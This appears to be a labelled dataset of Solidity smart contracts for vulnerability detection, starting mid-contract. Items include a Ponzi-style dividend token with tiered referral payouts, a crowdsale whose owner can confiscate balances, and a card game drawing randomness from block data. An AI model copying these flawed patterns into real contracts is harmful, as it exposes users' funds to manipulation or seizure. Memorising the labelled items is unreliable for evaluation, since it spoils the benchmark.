onlyBagholders()        public        returns(bool)    {                 address _customerAddress = msg.sender;                         require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);                         if(myDividends(true) > 0) withdraw();                 tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _amountOfTokens);                         payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);        payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _amountOfTokens);                         emit Transfer(_customerAddress, _toAddress, _amountOfTokens);                         return true;           }         function redistribution()        external        payable    {                 uint256 ethereum = msg.value;                         profitPerShare_ = SafeMath.add(profitPerShare_, (ethereum * magnitude) / tokenSupply_);                         emit OnRedistribution(ethereum, block.timestamp);    }             function setAdministrator(address _newAdmin)        onlyAdministrator()        external    {        owner = _newAdmin;    }             function setStakingRequirement(uint256 _amountOfTokens)        onlyAdministrator()        public    {        stakingRequirement = _amountOfTokens;    }             function setName(string _name)        onlyAdministrator()        public    {        name = _name;    }             function setSymbol(string _symbol)        onlyAdministrator()        public    {        symbol = _symbol;    }                  function totalEthereumBalance()        public        view        returns(uint)    {        return address(this).balance;    }             function totalSupply()        public        view        returns(uint256)    {        return tokenSupply_;    }             function myTokens()        public        view        returns(uint256)    {        address _customerAddress = msg.sender;        return balanceOf(_customerAddress);    }              function myDividends(bool _includeReferralBonus)         public         view         returns(uint256)    {        address _customerAddress = msg.sender;        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;    }             function balanceOf(address _customerAddress)        view        public        returns(uint256)    {        return tokenBalanceLedger_[_customerAddress];    }             function dividendsOf(address _customerAddress)        view        public        returns(uint256)    {        return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;    }             function sellPrice()         public         view         returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ - tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);            uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);            return _taxedEthereum;        }    }             function buyPrice()         public         view         returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ + tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);            uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);            return _taxedEthereum;        }    }             function calculateTokensReceived(uint256 _ethereumToSpend)         public         view         returns(uint256)    {        uint256 _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);        uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);                return _amountOfTokens;    }             function calculateEthereumReceived(uint256 _tokensToSell)         public         view         returns(uint256)    {        require(_tokensToSell <= tokenSupply_);        uint256 _ethereum = tokensToEthereum_(_tokensToSell);        uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);        return _taxedEthereum;    }        function disableWhitelist() onlyAdministrator() external {        whitelist_ = false;    }         function purchaseTokens(uint256 _incomingEthereum, address _referredBy)        limitBuy()        internal        returns(uint256)    {                                     if (whitelisted_[msg.sender] == false && whitelist_ == true) {             revert();        }                 address _customerAddress = msg.sender;        uint256 _undividedDividends = SafeMath.div(_incomingEthereum*dividendFee_, 100);             uint256 _referralBonus = SafeMath.div(_undividedDividends, 2);          uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);        uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, (_undividedDividends));        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);        uint256 _fee = _dividends * magnitude;                                            require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));                         if(                         _referredBy != 0x0000000000000000000000000000000000000000 &&                         _referredBy != _customerAddress &&                                                  tokenBalanceLedger_[_referredBy] >= stakingRequirement &&            referralOf_[_customerAddress] == 0x0000000000000000000000000000000000000000 &&            alreadyBought[_customerAddress] == false        ){            referralOf_[_customerAddress] = _referredBy;                                     referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], (_referralBonus / 2));              address tier2 = referralOf_[_referredBy];            if (tier2 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[tier2] >= stakingRequirement) {                referralBalance_[tier2] = SafeMath.add(referralBalance_[tier2], (_referralBonus*30 / 100));                                   if (referralOf_[tier2] != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[referralOf_[tier2]] >= stakingRequirement) {                    referralBalance_[referralOf_[tier2]] = SafeMath.add(referralBalance_[referralOf_[tier2]], (_referralBonus*20 / 100));                      }                else {                    _dividends = SafeMath.add(_dividends, (_referralBonus*20 / 100));                    _fee = _dividends * magnitude;                }            }            else {                _dividends = SafeMath.add(_dividends, (_referralBonus*30 / 100));                _fee = _dividends * magnitude;            }                    } else {                                      _dividends = SafeMath.add(_dividends, _referralBonus);            _fee = _dividends * magnitude;        }                         if(tokenSupply_ > 0){                                     tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);                          profitPerShare_ += (_dividends * magnitude / (tokenSupply_));                                     _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));                } else {                         tokenSupply_ = _amountOfTokens;        }                         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);                                  int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);        payoutsTo_[_customerAddress] += _updatedPayouts;        alreadyBought[_customerAddress] = true;                 emit onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);                return _amountOfTokens;    }         function ethereumToTokens_(uint256 _ethereum)        internal        view        returns(uint256)    {        uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;        uint256 _tokensReceived =          (            (                                 SafeMath.sub(                    (sqrt                        (                            (_tokenPriceInitial**2)                            +                            (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))                            +                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))                            +                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)                        )                    ), _tokenPriceInitial                )            )/(tokenPriceIncremental_)        )-(tokenSupply_)        ;          return _tokensReceived;    }             function tokensToEthereum_(uint256 _tokens)        internal        view        returns(uint256)    {        uint256 tokens_ = (_tokens + 1e18);        uint256 _tokenSupply = (tokenSupply_ + 1e18);        uint256 _etherReceived =        (                         SafeMath.sub(                (                    (                        (                            tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))                        )-tokenPriceIncremental_                    )*(tokens_ - 1e18)                ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2            )        /1e18);        return _etherReceived;    }                      function sqrt(uint x) internal pure returns (uint y) {        uint z = (x + 1) / 2;        y = x;        while (z < y) {            y = z;            z = (x / z + z) / 2;        }    }} library SafeMath {         function mul(uint256 a, uint256 b) internal pure returns (uint256) {        if (a == 0) {            return 0;        }        uint256 c = a * b;        assert(c / a == b);        return c;    }         function div(uint256 a, uint256 b) internal pure returns (uint256) {                 uint256 c = a / b;                 return c;    }         function sub(uint256 a, uint256 b) internal pure returns (uint256) {        assert(b <= a);        return a - b;    }         function add(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a + b;        assert(c >= a);        return c;    }}
1<CODESPLIT>contract PAIStandardToken is StandardToken,Ownable{  string public name;                   // name: eg pchain  uint256 public decimals;              //How many decimals to show.  string public symbol;                 //An identifier: eg PAI  address public wallet;                //ETH wallet address  uint public start;                    //crowd sale start time  uint public end;                      //Crowd sale first phase end time  uint public deadline;                 // Crowd sale deadline time  uint256 public teamShare = 25;        //Team share  uint256 public foundationShare = 25;  //Foundation share  uint256 public posShare = 15;         //POS share  uint256 public saleShare = 35;     //Private share      address internal saleAddr;                                 //private sale wallet address  uint256 public crowdETHTotal = 0;                 //The ETH amount of current crowdsale  mapping (address => uint256) public crowdETHs;    //record user's balance of crowdsale  uint256 public crowdPrice = 10000;                //crowdsale price 1(ETH):10000(PAI)  uint256 public crowdTarget = 5000 ether;          //The total ETH of crowdsale  bool public reflectSwitch = false;                // Whether to allow user to reflect PAI  bool public blacklistSwitch = true;               // Whether to allow owner to set blacklist  mapping(address => string) public reflects;       // reflect token to PAI address    event PurchaseSuccess(address indexed _addr, uint256 _weiAmount,uint256 _crowdsaleEth,uint256 _balance);  event EthSweepSuccess(address indexed _addr, uint256 _value);  event SetReflectSwitchEvent(bool _b);  event ReflectEvent(address indexed _addr,string _paiAddr);  event BlacklistEvent(address indexed _addr,uint256 _b);  event SetTransferLockEvent(bool _b);  event CloseBlacklistSwitchEvent(bool _b);  constructor(      address _wallet,      uint _s,      uint _e,      uint _d,      address _teamAddr,      address _fundationAddr,      address _saleAddr,      address _posAddr      ) {      totalSupply = 2100000000000000000000000000;       // Update total supply      name = "PCHAIN";                  // Set the name for display purposes      decimals = 18;           // Amount of decimals for display purposes      symbol = "PAI";              // Set the symbol for display purposes      wallet = _wallet;                   // Set ETH wallet address      start = _s;                         // Set start time for crowsale      end = _e;                           // Set Crowd sale first phase end time      deadline = _d;                      // Set Crowd sale deadline time      saleAddr = _saleAddr; // Set sale account address      balances[_teamAddr] = safeMul(safeDiv(totalSupply,100),teamShare); //Team balance      balances[_fundationAddr] = safeMul(safeDiv(totalSupply,100),foundationShare); //Foundation balance      balances[_posAddr] = safeMul(safeDiv(totalSupply,100),posShare); //POS balance      balances[_saleAddr] = safeMul(safeDiv(totalSupply,100),saleShare) ; //Sale balance        Transfer(address(0), _teamAddr,  balances[_teamAddr]);      Transfer(address(0), _fundationAddr,  balances[_fundationAddr]);      Transfer(address(0), _posAddr,  balances[_posAddr]);      Transfer(address(0), _saleAddr,  balances[_saleAddr]);  }  function setTransferLock(bool _lock) onlyOwner{      transferLock = _lock;      SetTransferLockEvent(_lock);  }  function closeBlacklistSwitch() onlyOwner{    blacklistSwitch = false;    CloseBlacklistSwitchEvent(false);  }  function setBlacklist(address _addr) onlyOwner{      require(blacklistSwitch);      uint256 tokenAmount = balances[_addr];             //calculate user token amount      balances[_addr] = 0;//clear user‘s PAI balance      balances[saleAddr] = safeAdd(balances[saleAddr],tokenAmount);  //add PAI tokenAmount to Sale      Transfer(_addr, saleAddr, tokenAmount);      BlacklistEvent(_addr,tokenAmount);  }   function setReflectSwitch(bool _s) onlyOwner{      reflectSwitch = _s;      SetReflectSwitchEvent(_s);  }  function reflect(string _paiAddress){      require(reflectSwitch);      reflects[msg.sender] = _paiAddress;      ReflectEvent(msg.sender,_paiAddress);  }  function purchase() payable{      require(block.timestamp <= deadline);                                 //the timestamp must be less than the deadline time      require(tx.gasprice <= 60000000000);      require(block.timestamp >= start);                                //the timestamp must be greater than the start time      uint256 weiAmount = msg.value;                                    // The amount purchased by the current user      require(weiAmount >= 0.1 ether);      crowdETHTotal = safeAdd(crowdETHTotal,weiAmount);                 // Calculate the total amount purchased by all users      require(crowdETHTotal <= crowdTarget);                            // The total amount is less than or equal to the target amount      uint256 userETHTotal = safeAdd(crowdETHs[msg.sender],weiAmount);  // Calculate the total amount purchased by the current user      if(block.timestamp <= end){                                       // whether the current timestamp is in the first phase        require(userETHTotal <= 0.4 ether);                             // whether the total amount purchased by the current user is less than 0.4ETH      }else{        require(userETHTotal <= 10 ether);                              // whether the total amount purchased by the current user is less than 10ETH      }                  crowdETHs[msg.sender] = userETHTotal;                             // Record the total amount purchased by the current user      uint256 tokenAmount = safeMul(weiAmount,crowdPrice);             //calculate user token amount      balances[msg.sender] = safeAdd(tokenAmount,balances[msg.sender]);//recharge user‘s PAI balance      balances[saleAddr] = safeSub(balances[saleAddr],tokenAmount);  //sub PAI tokenAmount from  Sale      wallet.transfer(weiAmount);      Transfer(saleAddr, msg.sender, tokenAmount);      PurchaseSuccess(msg.sender,weiAmount,crowdETHs[msg.sender],tokenAmount);   }  function () payable{      purchase();  }}
0<CODESPLIT>contract DragonDivs {              modifier onlyBagholders() {        require(myTokens() > 0);        _;    }         modifier onlyStronghands() {        require(myDividends(true) > 0);        _;    }                                                 modifier onlyAdministrator(){        require(msg.sender == owner);        _;    }    modifier limitBuy() {        if(limit && msg.value > 2 ether && msg.sender != owner) {              if ((msg.value) < address(this).balance && (address(this).balance-(msg.value)) >= 50 ether) {                  limit = false;            }            else {                revert();              }        }        _;    }         event onTokenPurchase(        address indexed customerAddress,        uint256 incomingEthereum,        uint256 tokensMinted,        address indexed referredBy    );    event onTokenSell(        address indexed customerAddress,        uint256 tokensBurned,        uint256 ethereumEarned    );    event onReinvestment(        address indexed customerAddress,        uint256 ethereumReinvested,        uint256 tokensMinted    );    event onWithdraw(        address indexed customerAddress,        uint256 ethereumWithdrawn    );    event OnRedistribution (        uint256 amount,        uint256 timestamp    );         event Transfer(        address indexed from,        address indexed to,        uint256 tokens    );         string public name = "DragonDivs";    string public symbol = "DRAGON";    uint8 constant public decimals = 18;    uint8 constant internal dividendFee_ = 25;      uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;    uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;    uint256 constant internal magnitude = 2**64;         uint256 public stakingRequirement = 0;             mapping(address => uint256) internal tokenBalanceLedger_;    mapping(address => address) internal referralOf_;    mapping(address => uint256) internal referralBalance_;    mapping(address => int256) internal payoutsTo_;    mapping(address => bool) internal alreadyBought;    uint256 internal tokenSupply_ = 0;    uint256 internal profitPerShare_;    mapping(address => bool) internal whitelisted_;    bool internal whitelist_ = true;    bool internal limit = true;    address public owner;              constructor()        public    {        owner = msg.sender;        whitelisted_[msg.sender] = true;          whitelist_ = true;    }         function buy(address _referredBy)        public        payable        returns(uint256)    {        purchaseTokens(msg.value, _referredBy);    }         function()        payable        public    {        purchaseTokens(msg.value, 0x0);    }         function reinvest()        onlyStronghands()        public    {                 uint256 _dividends = myDividends(false);                   address _customerAddress = msg.sender;        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                 _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                 uint256 _tokens = purchaseTokens(_dividends, 0x0);                 emit onReinvestment(_customerAddress, _dividends, _tokens);    }         function exit()        public    {                 address _customerAddress = msg.sender;        uint256 _tokens = tokenBalanceLedger_[_customerAddress];        if(_tokens > 0) sell(_tokens);                 withdraw();    }         function withdraw()        onlyStronghands()        public    {                 address _customerAddress = msg.sender;        uint256 _dividends = myDividends(false);                   payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                 _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                 _customerAddress.transfer(_dividends);                 emit onWithdraw(_customerAddress, _dividends);    }         function sell(uint256 _amountOfTokens)        onlyBagholders()        public    {                 address _customerAddress = msg.sender;                 require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);        uint256 _tokens = _amountOfTokens;        uint256 _ethereum = tokensToEthereum_(_tokens);        uint256 _undividedDividends = SafeMath.div(SafeMath.mul(_ethereum, dividendFee_), 100);          uint256 _referralBonus = SafeMath.div(_undividedDividends, 2);          uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);        uint256 _taxedEthereum = SafeMath.sub(_ethereum, (_dividends));        address _referredBy = referralOf_[_customerAddress];        if(                         _referredBy != 0x0000000000000000000000000000000000000000 &&                         _referredBy != _customerAddress &&                                      tokenBalanceLedger_[_referredBy] >= stakingRequirement        ){                         referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], (_referralBonus / 2));              address tier2 = referralOf_[_referredBy];            if (tier2 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[tier2] >= stakingRequirement) {                referralBalance_[tier2] = SafeMath.add(referralBalance_[tier2], (_referralBonus*30 / 100));                                   if (referralOf_[tier2] != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[referralOf_[tier2]] >= stakingRequirement) {                    referralBalance_[referralOf_[tier2]] = SafeMath.add(referralBalance_[referralOf_[tier2]], (_referralBonus*20 / 100));                      }                else {                    _dividends = SafeMath.add(_dividends, (_referralBonus*20 / 100));                }            }            else {                _dividends = SafeMath.add(_dividends, (_referralBonus*30 / 100));            }        } else {                                      _dividends = SafeMath.add(_dividends, _referralBonus);        }                 tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);                 int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));        payoutsTo_[_customerAddress] -= _updatedPayouts;                 if (tokenSupply_ > 0) {                         profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);        }                 emit onTokenSell(_customerAddress, _tokens, _taxedEthereum);    }          function transfer(address _toAddress, uint256 _amountOfTokens)        onlyBagholders()        public        returns(bool)    {                 address _customerAddress = msg.sender;                 require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);                 if(myDividends(true) > 0) withdraw();                 tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _amountOfTokens);                 payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);        payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _amountOfTokens);                 emit Transfer(_customerAddress, _toAddress, _amountOfTokens);                 return true;    }         function redistribution()        external        payable    {                 uint256 ethereum = msg.value;                 profitPerShare_ = SafeMath.add(profitPerShare_, (ethereum * magnitude) / tokenSupply_);                 emit OnRedistribution(ethereum, block.timestamp);    }         function setAdministrator(address _newAdmin)        onlyAdministrator()        external    {        owner = _newAdmin;    }         function setStakingRequirement(uint256 _amountOfTokens)        onlyAdministrator()        public    {        stakingRequirement = _amountOfTokens;    }         function setName(string _name)        onlyAdministrator()        public    {        name = _name;    }         function setSymbol(string _symbol)        onlyAdministrator()        public    {        symbol = _symbol;    }              function totalEthereumBalance()        public        view        returns(uint)    {        return address(this).balance;    }         function totalSupply()        public        view        returns(uint256)    {        return tokenSupply_;    }         function myTokens()        public        view        returns(uint256)    {        address _customerAddress = msg.sender;        return balanceOf(_customerAddress);    }         function myDividends(bool _includeReferralBonus)        public        view        returns(uint256)    {        address _customerAddress = msg.sender;        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;    }         function balanceOf(address _customerAddress)        view        public        returns(uint256)    {        return tokenBalanceLedger_[_customerAddress];    }         function dividendsOf(address _customerAddress)        view        public        returns(uint256)    {        return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;    }         function sellPrice()        public        view        returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ - tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereum, dividendFee_),100);            uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);            return _taxedEthereum;        }    }         function buyPrice()        public        view        returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ + tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereum, dividendFee_),100);            uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);            return _taxedEthereum;        }    }         function calculateTokensReceived(uint256 _ethereumToSpend)        public        view        returns(uint256)    {        uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereumToSpend, dividendFee_),100);        uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);        return _amountOfTokens;    }         function calculateEthereumReceived(uint256 _tokensToSell)        public        view        returns(uint256)    {        require(_tokensToSell <= tokenSupply_);        uint256 _ethereum = tokensToEthereum_(_tokensToSell);        uint256 _dividends =  SafeMath.div(SafeMath.mul(_ethereum, dividendFee_), 100);        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);        return _taxedEthereum;    }    function disableWhitelist() onlyAdministrator() external {        whitelist_ = false;    }         function purchaseTokens(uint256 _incomingEthereum, address _referredBy)        limitBuy()        internal        returns(uint256)    {                          if (whitelisted_[msg.sender] == false && whitelist_ == true) {            revert();        }                 address _customerAddress = msg.sender;        uint256 _undividedDividends = SafeMath.div(SafeMath.mul(_incomingEthereum, dividendFee_), 100);          uint256 _referralBonus = SafeMath.div(_undividedDividends, 2);          uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);        uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, (_undividedDividends));        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);        uint256 _fee = _dividends * magnitude;                                            require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));                 if(                         _referredBy != 0x0000000000000000000000000000000000000000 &&                         _referredBy != _customerAddress &&                                      tokenBalanceLedger_[_referredBy] >= stakingRequirement &&            referralOf_[_customerAddress] == 0x0000000000000000000000000000000000000000 &&            alreadyBought[_customerAddress] == false        ){            referralOf_[_customerAddress] = _referredBy;                         referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], (_referralBonus / 2));              address tier2 = referralOf_[_referredBy];            if (tier2 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[tier2] >= stakingRequirement) {                referralBalance_[tier2] = SafeMath.add(referralBalance_[tier2], (_referralBonus*30 / 100));                                   if (referralOf_[tier2] != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[referralOf_[tier2]] >= stakingRequirement) {                    referralBalance_[referralOf_[tier2]] = SafeMath.add(referralBalance_[referralOf_[tier2]], (_referralBonus*20 / 100));                      }                else {                    _dividends = SafeMath.add(_dividends, (_referralBonus*20 / 100));                    _fee = _dividends * magnitude;                }            }            else {                _dividends = SafeMath.add(_dividends, (_referralBonus*30 / 100));                _fee = _dividends * magnitude;            }        } else {                                      _dividends = SafeMath.add(_dividends, _referralBonus);            _fee = _dividends * magnitude;        }                 if(tokenSupply_ > 0){                         tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);                         profitPerShare_ += (_dividends * magnitude / (tokenSupply_));                         _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));        } else {                         tokenSupply_ = _amountOfTokens;        }                 tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);                          int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);        payoutsTo_[_customerAddress] += _updatedPayouts;        alreadyBought[_customerAddress] = true;                 emit onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);        return _amountOfTokens;    }         function ethereumToTokens_(uint256 _ethereum)        internal        view        returns(uint256)    {        uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;        uint256 _tokensReceived =         (            (                                 SafeMath.sub(                    (sqrt                        (                            (_tokenPriceInitial**2)                            +                            (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))                            +                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))                            +                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)                        )                    ), _tokenPriceInitial                )            )/(tokenPriceIncremental_)        )-(tokenSupply_)        ;        return _tokensReceived;    }         function tokensToEthereum_(uint256 _tokens)        internal        view        returns(uint256)    {        uint256 tokens_ = (_tokens + 1e18);        uint256 _tokenSupply = (tokenSupply_ + 1e18);        uint256 _etherReceived =        (                         SafeMath.sub(                (                    (                        (                            tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))                        )-tokenPriceIncremental_                    )*(tokens_ - 1e18)                ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2            )        /1e18);        return _etherReceived;    }              function sqrt(uint x) internal pure returns (uint y) {        uint z = (x + 1) / 2;        y = x;        while (z < y) {            y = z;            z = (x / z + z) / 2;        }    }} library SafeMath {         function mul(uint256 a, uint256 b) internal pure returns (uint256) {        if (a == 0) {            return 0;        }        uint256 c = a * b;        assert(c / a == b);        return c;    }         function div(uint256 a, uint256 b) internal pure returns (uint256) {                 uint256 c = a / b;                 return c;    }         function sub(uint256 a, uint256 b) internal pure returns (uint256) {        assert(b <= a);        return a - b;    }         function add(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a + b;        assert(c >= a);        return c;    }}
1<CODESPLIT>contract MamaToken {    uint public openingTime = 1527638401;      uint public closingTime = 1546214399;      function () external payable {        require(block.timestamp >= openingTime && block.timestamp <= closingTime);    }}
0<CODESPLIT>contract MigrationAgent {  function migrateFrom(address _from, uint256 _value);}
0<CODESPLIT>contract PitEur is Ownable, ERC20 {  using SafeMath for uint256;  uint8 private _decimals = 18;  uint256 private decimalMultiplier = 10**(uint256(_decimals));  string private _name = "PIT-EUR";  string private _symbol = "PIT-EUR";  uint256 private _totalSupply = 100000000 * decimalMultiplier;  bool public tradable = true;     address public multisig;     function name() constant returns (string) {    return _name;  }     function symbol() constant returns (string) {    return _symbol;  }     function decimals() constant returns (uint8) {    return _decimals;  }     function totalSupply() constant returns (uint256) {    return _totalSupply;  }  mapping(address => uint256) balances;  mapping(address => mapping (address => uint256)) allowed;  mapping(address => uint256) releaseTimes;  address public migrationAgent;  uint256 public totalMigrated;  event Migrate(address indexed _from, address indexed _to, uint256 _value);           function PitEur(address _multisig) {    require(_multisig != 0x0);    multisig = _multisig;    balances[multisig] = _totalSupply;  }  modifier canTrade() {    require(tradable);    _;  }        function transfer(address to, uint256 value) canTrade {    require(!isLocked(msg.sender));    require (balances[msg.sender] >= value && value > 0);    balances[msg.sender] = balances[msg.sender].sub(value);    balances[to] = balances[to].add(value);    Transfer(msg.sender, to, value);  }     function balanceOf(address who) constant returns (uint256) {    return balances[who];  }    function transferFrom(address from, address to, uint256 value) canTrade {    require(to != 0x0);    require(!isLocked(from));    uint256 _allowance = allowed[from][msg.sender];    require(value > 0 && _allowance >= value);    balances[from] = balances[from].sub(value);    balances[to] = balances[to].add(value);    allowed[from][msg.sender] = _allowance.sub(value);    Transfer(from, to, value);  }     function approve(address spender, uint256 value) canTrade {    require((value >= 0) && (allowed[msg.sender][spender] >= 0));    allowed[msg.sender][spender] = value;    Approval(msg.sender, spender, value);  }              function allowance(address owner, address spender) constant returns (uint256) {    return allowed[owner][spender];  }     function setTradable(bool _newTradableState) onlyOwner public {    tradable = _newTradableState;  }     function timeLock(address spender, uint256 date) public onlyOwner returns (bool) {    releaseTimes[spender] = date;    return true;  }     function isLocked(address _spender) public view returns (bool) {    if (releaseTimes[_spender] == 0 || releaseTimes[_spender] <= block.timestamp) {      return false;    }    return true;  }     function setMigrationAgent(address _agent) external onlyOwner {    require(migrationAgent == 0x0 && totalMigrated == 0);    migrationAgent = _agent;  }     function migrate(uint256 value) external {    require(migrationAgent != 0x0);    require(value >= 0);    require(value <= balances[msg.sender]);    balances[msg.sender] -= value;    _totalSupply = _totalSupply.sub(value);    totalMigrated = totalMigrated.add(value);    MigrationAgent(migrationAgent).migrateFrom(msg.sender, value);    Migrate(msg.sender, migrationAgent, value);  }}
1<CODESPLIT>contract Deck {	function deal(address player, uint8 cardNumber) internal returns (uint8) {		uint b = block.number;		uint timestamp = block.timestamp;		return uint8(uint256(keccak256(block.blockhash(b), player, cardNumber, timestamp)) % 52);	}}
0<CODESPLIT>contract RP1events {         event onNewName    (        uint256 indexed playerID,        address indexed playerAddress,        bytes32 indexed playerName,        bool isNewPlayer,        uint256 affiliateID,        address affiliateAddress,        bytes32 affiliateName,        uint256 amountPaid,        uint256 timeStamp    );             event onEndTx    (        uint256 compressedData,             uint256 compressedIDs,              bytes32 playerName,        address playerAddress,        uint256 ethIn,        uint256 keysBought,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 rp1Amount,        uint256 genAmount,        uint256 potAmount,        uint256 airDropPot    );    	     event onWithdraw    (        uint256 indexed playerID,        address playerAddress,        bytes32 playerName,        uint256 ethOut,        uint256 timeStamp    );             event onWithdrawAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 ethOut,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 rp1Amount,        uint256 genAmount    );                  event onBuyAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 ethIn,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 rp1Amount,        uint256 genAmount    );                  event onReLoadAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 rp1Amount,        uint256 genAmount    );             event onAffiliatePayout    (        uint256 indexed affiliateID,        address affiliateAddress,        bytes32 affiliateName,        uint256 indexed roundID,        uint256 indexed buyerID,        uint256 amount,        uint256 timeStamp    );             event onPotSwapDeposit    (        uint256 roundID,        uint256 amountAddedToPot    );}    
